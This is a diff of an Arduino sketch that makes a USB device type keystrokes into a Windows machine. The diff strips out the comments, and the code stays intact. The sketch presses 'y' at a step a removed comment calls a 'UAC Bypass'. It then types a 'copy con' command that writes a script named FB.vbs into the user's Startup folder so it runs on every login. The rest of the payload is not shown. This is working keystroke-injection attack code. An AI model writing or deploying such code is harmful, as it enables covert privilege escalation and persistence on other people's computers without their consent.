@@ -7,14 +7,11 @@ void typeKey(int key)
   Keyboard.release(key);
 }
 
-/* Init function */
 void setup()
 {
-  // Begining the Keyboard stream
   Keyboard.begin();
 
   delay(1000);
-  // ^ You should set more delay time if your computer is slow or if the script doesn't work correctly.
   
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press(KEY_LEFT_ESC);
@@ -35,11 +32,9 @@ void setup()
   Keyboard.press('y');
   Keyboard.releaseAll();
 
-  // ^ UAC Bypass
   delay(500);
 
   Keyboard.print("copy con \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\FB.vbs\"");
-  // ^ Installing the .vbs on startup folder
   
   typeKey(KEY_RETURN);
 
@@ -65,9 +60,7 @@ void setup()
 
   typeKey(KEY_RETURN);
 
-  // Ending stream
   Keyboard.end();
 }
 
-/* Unused endless loop */
 void loop() {}
